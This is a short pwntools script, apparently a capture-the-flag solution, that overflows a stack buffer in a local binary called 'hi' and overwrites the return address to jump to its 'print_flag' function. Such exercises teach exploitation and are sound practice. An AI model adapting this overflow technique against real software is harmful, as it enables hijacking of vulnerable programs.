from pwn import *

context.binary = "./hi"

garbage = b"A"*32
offset = b"B"*8
func_addr = p64(context.binary.functions["print_flag"].address)

p = process()
p.sendline(garbage + offset + func_addr)
p.interactive()
